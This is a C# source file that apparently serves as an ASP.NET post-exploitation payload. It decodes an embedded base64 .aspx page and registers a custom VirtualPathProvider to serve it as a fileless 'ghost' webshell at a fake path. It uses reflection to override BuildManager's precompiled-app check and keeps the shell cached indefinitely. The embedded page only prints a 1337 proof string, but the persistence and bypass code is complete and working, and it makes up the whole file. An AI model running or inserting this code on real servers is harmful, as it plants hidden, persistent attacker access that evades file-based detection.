class G
{
    public G()
    {
        // Author: Soroush Dalili (@irsdl)

        // base64-encoded version of a webshell.aspx file
        string webshellContentsBase64 = "PCVAIExhbmd1YWdlPSJDIyIlPgpUaGlzIGlzIHRoZSBhdHRhY2tlcidzIGZpbGUgPGJyLz4KUnVubmluZyBvbiB0aGUgc2VydmVyIGlmIGA8JT0xMzM4LTElPmAgaXMgMTMzNy4=";
        string webshellType = ".aspx";
        string webshellContent = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(webshellContentsBase64));


        string rootPath = System.Web.HttpContext.Current.Request.CurrentExecutionFilePath.TrimEnd('/').ToLower();
        // removing the application name when making the virtual directory
        int index = rootPath.IndexOf(System.Web.HttpContext.Current.Request.ApplicationPath.ToLower());
        if (index >= 0)
            rootPath = rootPath.Remove(index, System.Web.HttpContext.Current.Request.ApplicationPath.Length);

        // fiddle with targetVirtualPath if needed and you know what path can be used to create the virtual path
        string prefix = "";
        if (rootPath.LastIndexOf("/") > 0)
            prefix = rootPath.Substring(0, rootPath.LastIndexOf("/"));

        string targetVirtualPath = prefix + "/fakepath31337/";

        targetVirtualPath = targetVirtualPath.Replace("//", "/");


        //System.Web.HttpContext.Current.Response.AddHeader("INFO", System.Web.Compilation.BuildManager.IsPrecompiledApp.ToString()); // info leak
        //System.Web.HttpContext.Current.Response.AddHeader("via", "yso"); // beacon

        try
        {
            //SamplePathProvider sampleProvider = new SamplePathProvider("fakepath1337", @"This is the attacker's file - running on the server if this `<%=1338-1%>` is 1337.");
            SamplePathProvider sampleProvider = new SamplePathProvider(targetVirtualPath, webshellContent);

            // Uncomment this if FriendlyUrlSettings is used! Remember to include Microsoft.AspNet.FriendlyUrls.dll
            /*
            
            foreach (var route in System.Web.Routing.RouteTable.Routes)
            {
                
                if (route.GetType().FullName == "Microsoft.AspNet.FriendlyUrls.FriendlyUrlRoute")
                {
                    var FriendlySetting = route.GetType().GetProperty("Settings", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.Public);
                    var settings = new Microsoft.AspNet.FriendlyUrls.FriendlyUrlSettings();
                    settings.AutoRedirectMode = Microsoft.AspNet.FriendlyUrls.RedirectMode.Off;
                    FriendlySetting.SetValue(route, settings);
                }
            }
            //*/

            sampleProvider.InitializeLifetimeService(); // we want our web shell to remain there forever (NO. 1)

            System.Reflection.FieldInfo field_isPrecompiledAppComputed = null;
            System.Reflection.FieldInfo field_isPrecompiledApp = null;
            object field_theBuildManager_instance = null;
            object field_isPrecompiledAppComputed_oldValue = null;
            object field_isPrecompiledApp_oldValue = null;


            if (System.Web.Compilation.BuildManager.IsPrecompiledApp)
            {
                // To disable isPrecompiledApp settings
                var typeBuildManager = typeof(System.Web.Compilation.BuildManager);
                System.Reflection.FieldInfo field_theBuildManager = typeBuildManager.GetField("_theBuildManager", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
                field_isPrecompiledAppComputed = typeBuildManager.GetField("_isPrecompiledAppComputed", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
                field_isPrecompiledApp = typeBuildManager.GetField("_isPrecompiledApp", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
                field_theBuildManager_instance = field_theBuildManager.GetValue(null);
                field_isPrecompiledAppComputed_oldValue = field_isPrecompiledAppComputed.GetValue(field_theBuildManager_instance);
                field_isPrecompiledApp_oldValue = field_isPrecompiledApp.GetValue(field_theBuildManager_instance);
                field_isPrecompiledAppComputed.SetValue(field_theBuildManager_instance, true);
                field_isPrecompiledApp.SetValue(field_theBuildManager_instance, false);
            }

            // IsPrecompiledApp is false!
            System.Web.Hosting.HostingEnvironment.RegisterVirtualPathProvider(sampleProvider);

            if (field_isPrecompiledAppComputed != null)
            {
                // To reverse isPrecompiledApp settings
                field_isPrecompiledAppComputed.SetValue(field_theBuildManager_instance, field_isPrecompiledAppComputed_oldValue);
                field_isPrecompiledApp.SetValue(field_theBuildManager_instance, field_isPrecompiledApp_oldValue);
            }

            System.Web.HttpContext.Current.Response.Clear();
            System.Web.HttpContext.Current.Response.BufferOutput = true;

            //*
            System.Web.HttpContext.Current.Server.Execute(targetVirtualPath + "ghostfile" + (new System.Random()).Next(1000) + webshellType); // if you need to compile a file immediately
            System.Web.HttpContext.Current.Response.End();

            //*/
            //OR
            /*
            string redirectionTarget = (System.Web.HttpContext.Current.Request.ApplicationPath + targetVirtualPath + "ghostfile" + (new System.Random()).Next(1000) + webshellType).Replace("//", "/");
            System.Web.HttpContext.Current.Response.Redirect(redirectionTarget);
            //*/
        }
        catch (System.Exception error)
        {
            System.Web.HttpContext.Current.Response.AddHeader("Errors", System.Web.HttpUtility.UrlEncode(error.ToString()));
        }
    }

    public class myHandler : System.Web.IHttpHandler, System.Web.Routing.IRouteHandler
    {
        public bool IsReusable
        {
            get { return true; }
        }

        public void ProcessRequest(System.Web.HttpContext context)
        {
            // your processing here
        }

        public System.Web.IHttpHandler GetHttpHandler(System.Web.Routing.RequestContext requestContext)
        {
            return this;
        }
    }
    // Reference: https://docs.microsoft.com/en-us/dotnet/api/system.web.hosting.virtualpathprovider?view=netframework-4.8
    public class SamplePathProvider : System.Web.Hosting.VirtualPathProvider
    {
        private string _virtualDir;
        private string _fileContent;

        public SamplePathProvider(string virtualDir, string fileContent)
          : base()
        {

            _virtualDir = "/" + virtualDir.Replace(@"\", "/");
            _virtualDir = _virtualDir.Replace("//", "/").TrimEnd('/');

            _fileContent = fileContent;
        }

        protected override void Initialize()
        { }

        private bool IsPathVirtual(string virtualPath)
        {
            //return true; // uncomment this if you need to take over all non-compiled files! this can be very disruptive and can cause DoS
            System.String checkPath = System.Web.VirtualPathUtility.ToAppRelative(virtualPath);
            return checkPath.ToLower().Contains(_virtualDir.ToLower()); // checkPath.ToLower().Contains(_virtualDir.ToLower()) && checkPath.ToLower().EndsWith(".aspx");
        }

        public override bool FileExists(string virtualPath)
        {
            if (IsPathVirtual(virtualPath))
            {
                return true;
            }
            else
            {
                return Previous.FileExists(virtualPath);
            }
        }

        public override bool DirectoryExists(string virtualDir)
        {
            if (IsPathVirtual(virtualDir))
            {
                return true;
            }
            else
            {
                return Previous.DirectoryExists(virtualDir);
            }
        }

        public override System.Web.Hosting.VirtualFile GetFile(string virtualPath)
        {
            if (IsPathVirtual(virtualPath))
                return new SampleVirtualFile(virtualPath, _fileContent);
            else
                return Previous.GetFile(virtualPath);
        }


        public override System.Web.Hosting.VirtualDirectory GetDirectory(string virtualDir)
        {
            if (IsPathVirtual(virtualDir))
                return new SampleVirtualDirectory(virtualDir);
            else
                return Previous.GetDirectory(virtualDir);
        }

        public override System.Web.Caching.CacheDependency GetCacheDependency(
          string virtualPath,
          System.Collections.IEnumerable virtualPathDependencies,
          System.DateTime utcStart)
        {
            if (IsPathVirtual(virtualPath))
            {
                /*
                System.Collections.Specialized.StringCollection fullPathDependencies = null;

                // Get the full path to all dependencies.
                foreach (string virtualDependency in virtualPathDependencies)
                {
                    if (fullPathDependencies == null)
                        fullPathDependencies = new System.Collections.Specialized.StringCollection();

                    fullPathDependencies.Add(virtualDependency);
                }
                if (fullPathDependencies == null)
                    return null;

                // Copy the list of full-path dependencies into an array.
                string[] fullPathDependenciesArray = new string[fullPathDependencies.Count];
                fullPathDependencies.CopyTo(fullPathDependenciesArray, 0);
                
                // Copy the virtual path into an array.
                string[] virtualPathArray = new string[1];
                virtualPathArray[0] = @"c:\";

                return new System.Web.Caching.CacheDependency(virtualPathArray, fullPathDependenciesArray, utcStart);
                */

                // we want our web shell to remain  longer than usual! (NO. 2) - uncomment above if you want a shorter expiry
                return new System.Web.Caching.CacheDependency(@"c:\");
            }
            else
            {
                return Previous.GetCacheDependency(virtualPath, virtualPathDependencies, utcStart);
            }
        }
    }

    public class SampleVirtualFile : System.Web.Hosting.VirtualFile
    {
        private string _fileContent;
        public bool Exists
        {
            get { return true; }
        }

        public SampleVirtualFile(string virtualPath, string fileContent)
          : base(virtualPath)
        {
            this._fileContent = fileContent;
        }

        public override System.IO.Stream Open()
        {
            System.IO.Stream stream = new System.IO.MemoryStream(System.Text.Encoding.UTF8.GetBytes(_fileContent));
            return stream;
        }
    }

    public class SampleVirtualDirectory : System.Web.Hosting.VirtualDirectory
    {
        public SampleVirtualDirectory(string virtualDir)
          : base(virtualDir)
        {
            string path = virtualDir;

            // System.Web.Hosting.HostingEnvironment.ApplicationVirtualPath or System.Web.HttpContext.Current.Request.ApplicationPath ? */
            if (System.Web.HttpContext.Current.Request.ApplicationPath != "/")
            {
                int index = virtualDir.IndexOf(System.Web.HttpContext.Current.Request.ApplicationPath.ToLower());
                if (index >= 0)
                    path = virtualDir.Remove(index, System.Web.HttpContext.Current.Request.ApplicationPath.Length);
            }

            path = path.TrimEnd('/');

            if (!string.IsNullOrEmpty(path))
            {

                //SampleVirtualDirectory svd = new SampleVirtualDirectory(path);
                children.Add(this);
                directories.Add(this);

                SampleVirtualFile svf = new SampleVirtualFile(path + "/ghostfile.aspx", "");
                children.Add(svf);
                files.Add(svf);
            }
        }

        private System.Collections.ArrayList children = new System.Collections.ArrayList();
        public override System.Collections.IEnumerable Children
        {
            get { return children; }
        }

        private System.Collections.ArrayList directories = new System.Collections.ArrayList();
        public override System.Collections.IEnumerable Directories
        {
            get { return directories; }
        }

        private System.Collections.ArrayList files = new System.Collections.ArrayList();
        public override System.Collections.IEnumerable Files
        {
            get { return files; }
        }
    }
}